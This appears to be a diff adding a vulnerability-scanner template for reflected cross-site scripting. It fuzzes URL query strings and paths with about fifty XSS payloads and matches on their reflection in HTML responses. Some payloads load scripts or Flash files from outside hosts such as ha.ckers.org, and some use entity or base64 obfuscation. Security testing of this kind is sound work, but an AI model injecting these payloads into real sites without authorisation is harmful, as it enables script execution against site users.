@@ -1,0 +1,102 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<html onbeforepaste=\"alert(1)\" contenteditable>test</html>"
+        - "<script>alert('XSS')</script"
+        - "<embed src=\"http://ha.ckers.org/xss.swf\">"
+        - "<canvas id=x onmouseout=alert(1)>&nbsp;</canvas>
+<iframe/src=\"data:text/html,&lt;script>alert(&#39;XSS&#39;)&lt;/script&gt;\">"
+        - "<head onkeypress=\"alert(1)\" contenteditable>test</head>"
+        - "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click"
+        - "<iframe/onload=javascript:alert(1)>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>"
+        - "<script src=\"http://ha.ckers.org/ie6.html\"></script>"
+        - "<style>:target {color:red;}</style><a id=x style=\"transition:color 10s\" ontransitionend=alert(1)></a>"
+        - "<head draggable=\"true\" ondragstart=\"alert(1)\">test</head>"
+        - "<object code='data:text/html;base64,PHN2Zy9wYXJhbSUzRC8iIj48dGltZXM+PC9hZD4v'>"
+        - "<menu onmouseleave=\"alert(1)\">test</menu>"
+        - "<style>:target {color:red;}</style><optgroup id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></optgroup>"
+        - "<meta content='javascript&#58;alert(1);'>"
+        - "<script>alert(\"XSS\")</script>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&#111;&#110;alert(1)\" http-equiv=\"refresh\"/>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\">"
+        - "<html draggable=\"true\" ondragend=\"alert(1)\">test</html>"
+        - "&lt;SCRIPT SRC=//ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;"
+        - "<input type=image src=xxx:x onerror=javascript:alert(1)>//"
+        - "<div draggable=\"true\" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>"
+        - "<script>alert(\"XSS\")//"
+        - "<iframe/src=\"data:text/html,%3C%3Ejavascript:alert(1)%3C/%3E\"></iframe>
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<iframe src=javascript:alert(1)</iframe>"
+        - "&lt;iframe src&gt;/onload=alert(1)&lt;/iframe&gt;
+<object data=/http://ha.ckers.org/scriptlet.html type=text/html/javascript&gt;"
+        - "<html onkeypress=\"alert(1)\" contenteditable>test</html>"
+        - "<script>alert(1)</script>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><iframe/src=//ha.ckers.org/xss.swf onload='alert('XSS');'></iframe"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>
+<script>alert(\"hellox world\")//<"
+        - "<embed code=\"http://jsfiddle.net/XLE63/\"></embed>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<audio onpause=alert(1) autoplay controls><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<meta oncopy=\"alert(1)\" contenteditable>test</meta>"
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=javascript:alert(1)"
+        - "<style>:target {color:red}</style><ul id=x style=\"transition:color 10s\" ontransitionend=alert(1)></ul>"
+        - "<xmp onmouseup=\"alert(1)\">test</xmp>"
+        - "<head onmouseout=\"alert(1)\">test</head>"
+        - "<style>:target {transform: rotate(180deg);}</style><pre id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></pre>"
+        - "<script/</a/script>"
+        - "<iframe/src=\"data:text/html,&lt;img src=x onerror='javascript:alert(1);'>\"></iframe/src>"
+        - "<img src=onerror=javascript:alert(1)>"
+        - "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<tr onkeyup=\"alert(1)\" contenteditable>test</tr"
+        - "<style>:target {color:red;}</style><div id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></div>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></video>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
